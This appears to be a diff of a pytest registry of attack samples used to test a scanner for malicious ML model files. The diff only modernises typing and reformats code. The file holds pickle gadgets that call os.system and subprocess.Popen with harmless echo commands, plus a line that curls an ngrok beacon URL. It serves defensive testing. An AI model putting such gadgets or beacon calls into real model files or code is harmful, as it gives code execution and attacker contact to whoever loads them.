@@ -17,13 +17,11 @@ Usage in tests:
 """
 
 import json
-import os
 import struct
 import sys
-import tempfile
+from collections.abc import Callable
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Callable, List, Optional
 
 import pytest
 
@@ -38,7 +36,6 @@ from scanner.analyzer.sandbox_executor import sandbox_execute
 from scanner.analyzer.symbolic_resolver import resolve_strings_in_source
 from scanner.analyzer.taint_engine import analyze_taint
 
-
 # ═══════════════════════════════════════════════════════════════════════
 # Attack Technique Registry
 # ═══════════════════════════════════════════════════════════════════════
@@ -52,21 +49,14 @@ class AttackTechnique:
     name: str
     category: str  # "pickle", "safetensors", "gguf", "source", "supply_chain"
     create_payload: Callable[[], bytes | str]
-    expected_rules: List[str] = field(default_factory=list)
+    expected_rules: list[str] = field(default_factory=list)
     description: str = ""
     source_incident: str = ""
 
 
 def _pickle_os_system() -> bytes:
     """Basic os.system pickle gadget."""
-    return (
-        b"\x80\x02"
-        b"\x8c\x02os"
-        b"\x8c\x06system"
-        b"\x93"
-        b"\x8c\x0eecho REDTEAM01"
-        b"\x85R."
-    )
+    return b"\x80\x02\x8c\x02os\x8c\x06system\x93\x8c\x0eecho REDTEAM01\x85R."
 
 
 def _pickle_builtins_eval() -> bytes:
@@ -107,14 +97,7 @@ def _pickle_protocol4_eval() -> bytes:
 
 def _pickle_subprocess() -> bytes:
     """subprocess.Popen in pickle."""
-    return (
-        b"\x80\x02"
-        b"\x8c\nsubprocess"
-        b"\x8c\x05Popen"
-        b"\x93"
-        b"\x8c\x07echo hi"
-        b"\x85R."
-    )
+    return b"\x80\x02\x8c\nsubprocess\x8c\x05Popen\x93\x8c\x07echo hi\x85R."
 
 
 def _safetensors_c2_metadata() -> bytes:
@@ -262,7 +245,7 @@ subprocess.Popen(["curl", "https://ngrok-free.app/beacon"])
 # Master Technique Registry
 # ═══════════════════════════════════════════════════════════════════════
 
-ATTACK_TECHNIQUES: List[AttackTechnique] = [
+ATTACK_TECHNIQUES: list[AttackTechnique] = [
     # Pickle attacks
     AttackTechnique(
         id="pickle-os-system",
@@ -403,17 +386,17 @@ ATTACK_TECHNIQUES: List[AttackTechnique] = [
 # ═══════════════════════════════════════════════════════════════════════
 
 
-def get_techniques_by_category(category: str) -> List[AttackTechnique]:
+def get_techniques_by_category(category: str) -> list[AttackTechnique]:
     """Get all techniques for a specific category."""
     return [t for t in ATTACK_TECHNIQUES if t.category == category]
 
 
-def get_all_technique_ids() -> List[str]:
+def get_all_technique_ids() -> list[str]:
     """Get all technique IDs for parametrization."""
     return [t.id for t in ATTACK_TECHNIQUES]
 
 
-def get_technique_by_id(technique_id: str) -> Optional[AttackTechnique]:
+def get_technique_by_id(technique_id: str) -> AttackTechnique | None:
     """Look up a technique by its ID."""
     for t in ATTACK_TECHNIQUES:
         if t.id == technique_id:
@@ -604,6 +587,3 @@ def safetensors_technique(request) -> AttackTechnique:
 def gguf_technique(request) -> AttackTechnique:
     """Parametrized fixture for GGUF-only attack techniques."""
     return request.param
-
-
-
